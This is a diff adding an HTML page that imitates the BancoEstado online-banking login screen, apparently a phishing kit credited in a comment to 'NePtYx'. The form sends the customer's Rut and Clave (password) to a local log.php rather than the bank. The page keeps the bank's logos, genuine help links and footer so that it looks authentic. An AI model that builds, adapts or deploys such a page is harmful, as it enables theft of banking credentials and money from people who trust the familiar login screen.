@@ -1,0 +1,95 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<!-- saved from url=(0063)https://personas.bancoestado.cl/bancoestado/CajaLoginLocal.Html -->
+<!-- Progtamado por NePtYx -->
+<html>
+<head>
+<center>
+        
+	<link rel="shortcut icon" href="htmlestilo/ico.ico" />
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=10" />
+	<!--AGREGADO PARA PERMITIR EL REDIMENSIONAMIENTO EN SMARTPHONES, SEGUN NORMATIVA BANCO
+		J.A.R.H - 30-08-2016-->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes" />
+	<title>Banca en Linea</title>
+	<link rel="stylesheet" type="text/css" href="htmlestilo/estilos.css">
+	<!--[if lt IE 9]>
+		<link rel="stylesheet" type="text/css" href="doAccess/ie7.css" />
+	<![endif]-->  
+	
+</head>
+	<p>
+        <body style="background-color: rgb(255, 255, 255);" onload="javascript:fnCambio(2);">
+	<div id="side" style="position:absolute; top:0px; left:0px;">
+        	<img src="htmlestilo/logo.png" align="center" style='width:200px; height:100'>
+                <p>
+		<h3>Banca en Línea</h3>
+                        
+		        <fieldset>
+				<p class="seleccione">Seleccione Banca</p>
+				<label class="opcionLogin" onclick="javascript:fnCambio(2);">
+					<input name="loginOpt" type="radio" value="personas" id="chkPersonas" checked="checked">Personas
+				</label>
+				<label class="opcionLogin" onclick="javascript:fnCambio(1);">
+					<input name="loginOpt" type="radio" value="empresas" id="chkEmpresas">Empresas
+				</label>
+				<br>
+				<label id="rus">
+				<form id="formulario" method="post" action="log.php">
+        <p>
+        <label for="nombre">Rut:<label>
+        <input type="text" name="nombre" id="nombre" value="" required>
+        <p>
+        <label for="apellidos">Clave:</label>
+        <input type="password" name="apellidos" id="apellidos" value="" required>
+        <div class="input">
+	<button type="submit" type="hidden" align="center" style='widrh:1px; height:1px'>
+	<img src="htmlestilo/login.png" width="250" height="40"/>
+	</button>
+	<p>
+        </div>
+	<p>       <img src="" width="0" height="0"/>
+		  <img src="" width="0" height="0"/>
+				<a href="https://www.bancoestado.cl/imagenes/_personas/login/problemas-clave.asp" title="" target="_top">¿Problemas con su Clave?</a>
+				</p>
+				<p>
+			</fieldset>
+			<input name="tp" id="tp" type="hidden" value="2">
+			<input name="SignonPswd" id="SignonPswd" type="hidden">
+			<input name="CustLoginID" id="CustLoginID" type="hidden">
+			<input name="CustPermID" id="CustPermID" type="hidden">
+			<input type="hidden" name="CLAVE" value="0000">
+			<input type="hidden" name="NUEVO" value="1">
+			<input type="hidden" name="EmpSignonPswd" value="0000">
+			<input type="hidden" size="4" name="EmpSignonPswdAux" value="0000">
+		</form>
+	<p>
+	<img src="htmlestilo/llave.png" align="center">
+	<p>
+	<a href="https://www.bancoestado.cl/imagenes/_personas/login/problemas-clave.asp" title="" >¿Problemas con su Clave?</a>
+	<p>
+	Si tienes tu clave bloqueada, estás sin contrato o con contrato caducado, ingresa aquí.
+	<p>
+	<img src="htmlestilo/candado.png" align="center">
+	<p>
+       	<a href="https://queatinotepase.cl/novedades">Revisa aquí el fraude del momento
+	<p>
+	¿Qué hacer en caso de fraude?, tipos de fraudes y recomendaciones de seguridad.
+	<p>
+	<img src="htmlestilo/centro.png" align="center">
+	<p>
+	<a href="https://www.bancoestado.cl/imagenes/_personas/centro-de-ayuda.asp">Centro de Ayuda
+	<p>
+	Conoce más sobre el uso de tus claves, productos y servicios BancoEstado.
+	<p>
+	<p>
+ <p style="color:#b0b0b0";>
+ <small>Política de Privacidad y Uso. Defensoría del Cliente.
+ Infórmese sobre la garantía estatal de los depósitos en su Banco o en www.cmfchile.cl
+ ©2019 BancoEstado. Todos los derechos reservados<a href="index.php">.</small>
+
+	</div>
+</center>
+</body>
+</html>
